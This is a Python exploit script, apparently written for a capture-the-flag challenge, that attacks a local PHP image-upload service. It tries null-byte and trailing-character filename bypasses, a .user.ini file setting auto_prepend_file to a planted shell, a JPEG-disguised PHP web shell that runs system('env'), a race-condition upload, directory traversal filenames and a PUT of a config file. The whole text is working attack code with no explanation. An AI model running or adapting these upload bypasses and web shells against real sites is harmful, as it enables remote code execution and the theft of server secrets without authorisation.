import requests
import time

base_url = "http://127.0.0.1:33021"

# Create minimal valid JPEG
def create_minimal_jpeg():
    jpeg = b'\xff\xd8'
    jpeg += b'\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
    jpeg += b'\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t'
    jpeg += b'\x08\x0a\x0c\x14\x0d\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a'
    jpeg += b'\x1f\x1e\x1d\x1a\x1c\x1c $.\x28 #\x17\x1c,),.444444)\x22\x22\x22'
    jpeg += b'\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00'
    jpeg += b'\xff\xc4\x00\x1f\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00'
    jpeg += b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b'
    jpeg += b'\xff\xda\x00\x08\x01\x01\x00\x00?\x00'
    jpeg += b'\x7f\xd4\xb5\xa8\x88'
    jpeg += b'\xff\xd9'
    return jpeg

jpeg_content = create_minimal_jpeg()

# Test 1: Try uploading with a space/null at end to bypass .jpg appending
print("[*] TEST 1: Try null byte and space in filename")
filenames = [
    '.user.ini\x00.jpg',
    '.user.ini ',
    '.user.ini.',
    '.user.ini%00',
    ' .user.ini',
    '.user.ini.JPG',
    '.user.ini.jpeg',
]
for fname in filenames:
    # Create a valid JPEG with .user.ini content
    userini_jpeg = jpeg_content + b'\nauto_prepend_file=shell.jpg\n'
    files = {'userfile': (fname, userini_jpeg, 'image/jpeg')}
    try:
        r = requests.post(f"{base_url}/index.php", files=files)
        # Check if .user.ini was created
        r2 = requests.get(f"{base_url}/upload/.user.ini")
        if r2.status_code == 200:
            print(f"[!!!] .user.ini uploaded with filename: {repr(fname)}")
            print(f"[+] Content: {r2.text}")
    except:
        pass

# Test 2: Try uploading .user.ini directly (might not check extension if valid JPEG)
print("\n[*] TEST 2: Upload .user.ini with JPEG magic bytes at start")
userini_content = jpeg_content + b'\nauto_prepend_file=shell.jpg\n'
files = {'userfile': ('.user.ini', userini_content, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Response: {r.text[:500]}")

# Check for .user.ini
r = requests.get(f"{base_url}/upload/.user.ini")
print(f"[+] .user.ini: {r.status_code}")
if r.status_code == 200:
    print(f"[!!!] .user.ini EXISTS! Content: {r.text}")

# Test 3: Check what files exist now
print("\n[*] TEST 3: Check for config files in upload dir")
config_files = ['.user.ini', '.htaccess', 'php.ini', '.php.ini', 'web.config']
for f in config_files:
    r = requests.get(f"{base_url}/upload/{f}")
    if r.status_code == 200:
        print(f"[!!!] {f} EXISTS!")
        print(f"[+] Content: {r.text}")

# Test 4: Try race condition - access file while being uploaded
print("\n[*] TEST 4: Race condition test")
import threading
shell_jpeg = jpeg_content + b'<?php system("env"); ?>'
race_file = 'race.jpg'

def upload_file():
    files = {'userfile': (race_file, shell_jpeg, 'image/jpeg')}
    requests.post(f"{base_url}/index.php", files=files)

def access_file():
    for _ in range(10):
        r = requests.get(f"{base_url}/upload/{race_file}")
        if 'FLAG' in r.text:
            print(f"[!!!] FLAG in race test: {r.text}")

t1 = threading.Thread(target=upload_file)
t2 = threading.Thread(target=access_file)
t1.start()
t2.start()
t1.join()
t2.join()

# Test 5: Check if we can upload to a different directory
print("\n[*] TEST 5: Directory traversal in filename")
paths = [
    '../shell.jpg',
    '../../shell.jpg',
    '../.user.ini',
]
for path in paths:
    files = {'userfile': (path, shell_jpeg, 'image/jpeg')}
    r = requests.post(f"{base_url}/index.php", files=files)
    # Check parent directory
    parts = path.replace('../', '').replace('..', '').split('/')
    if len(parts) > 1:
        test_path = parts[-1]
        r2 = requests.get(f"{base_url}/upload/{test_path}")
        r3 = requests.get(f"{base_url}/{test_path}")
        if r2.status_code == 200 or r3.status_code == 200:
            print(f"[!] Path traversal might work with {path}")

# Test 6: Check server signature more carefully
print("\n[*] TEST 6: Server analysis")
r = requests.get(f"{base_url}/")
print(f"[+] Server: {r.headers.get('Server')}")
print(f"[+] X-Powered-By: {r.headers.get('X-Powered-By')}")

# Test 7: Check if shell.jpg content is correct
print("\n[*] TEST 7: Verify shell.jpg content")
r = requests.get(f"{base_url}/upload/shell.jpg")
print(f"[+] Status: {r.status_code}")
print(f"[+] Content: {r.text}")

# Test 8: Try uploading a real .user.ini without JPEG header (test validation)
print("\n[*] TEST 8: Upload pure .user.ini (no JPEG header)")
pure_userini = b'auto_prepend_file=shell.jpg'
files = {'userfile': ('.user.ini', pure_userini, 'text/plain')}
r = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Response: {r.text[:500]}")

# Test 9: Check if the upload directory allows .user.ini
print("\n[*] TEST 9: Check if we can PUT .user.ini")
userini_data = 'auto_prepend_file=shell.jpg'
r = requests.put(f"{base_url}/upload/.user.ini", data=userini_data)
print(f"[+] PUT .user.ini: {r.status_code}")

# Test 10: Options request
print("\n[*] TEST 10: Check allowed HTTP methods")
r = requests.options(f"{base_url}/upload/")
print(f"[+] Allow header: {r.headers.get('Allow', 'None')}")

